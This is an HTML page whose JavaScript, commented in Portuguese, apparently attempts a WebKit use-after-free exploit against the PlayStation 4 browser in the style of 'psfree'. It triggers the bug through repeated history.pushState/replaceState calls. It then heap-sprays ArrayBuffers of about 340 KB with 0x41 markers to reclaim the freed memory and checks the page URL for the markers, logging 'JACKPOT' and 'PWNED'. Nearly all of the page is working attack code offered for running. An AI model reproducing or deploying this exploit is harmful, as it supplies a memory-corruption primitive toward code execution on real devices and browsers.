<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - ArrayBuffer Reclaim (340KB)</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #004400; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #fff; background-color: #008800; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - ArrayBuffer Reclaim (340KB Target)</h2>
<div id="status">Estratégia: Raw Buffer (psfree style)</div>

<button onclick="runBufferExploit()">INICIAR RECLAIM (340KB)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runBufferExploit() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Rodando...";

    // === CONFIGURAÇÃO BASEADA NO SEU DIAGNÓSTICO ===
    // Buraco confirmado: 340.356 bytes.
    // Estratégia: Usar ArrayBuffer puro (sem conversão de string).
    const TARGET_SIZE = 340356;
    
    log("1. Disparando UAF Original...");
    
    let size = 977;
    const STEP = 14461;

    // Loop do UAF Intacto
    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // Na última volta, fazemos o spray IMEDIATAMENTE após o back() ser agendado
        if (i === 47) {
             log(">>> SPRAY ARRAYBUFFER (340KB +/- variação) <<<");
             // Executa spray síncrono para tentar pegar a memória no ato
             doBufferSpray(TARGET_SIZE);
        } else {
             size += STEP;
             await sleep(5);
        }
    }
    
    await sleep(200);

    // === VERIFICAÇÃO ===
    checkResult();
}

function doBufferSpray(targetSize) {
    // Tenta cobrir a diferença de headers entre StringImpl e ArrayBufferContents
    // Varia o tamanho de -128 a +128 bytes
    for(let delta = -128; delta <= 128; delta += 8) {
        try {
            let trySize = targetSize + delta;
            
            // Técnica do psfree.mjs: Uint8Array sobre ArrayBuffer
            let buf = new ArrayBuffer(trySize);
            let view = new Uint8Array(buf);
            
            // Preenche o início e o fim com marcadores 'A' (0x41)
            // Não preenchemos tudo para ser rápido (O(1))
            view[0] = 0x41;
            view[1] = 0x41;
            view[2] = 0x41;
            view[3] = 0x41;
            
            // Preenche o meio (onde a URL provavelmente lê)
            let mid = Math.floor(trySize / 2);
            view[mid] = 0x41;
            view[mid+1] = 0x41;
            
            keepAlive.push(view);
        } catch(e) {}
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por 'A' (0x41)
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x41) { 
            changed = true;
            sample = "Encontrado 'AAAA' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("ArrayBuffer ocupou a memória!");
        log(sample);
        statusEl.innerText = "PWNED";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Tamanho do buffer testado: ~" + 340356 + " bytes");
    }
}
</script>
</body>
</html>
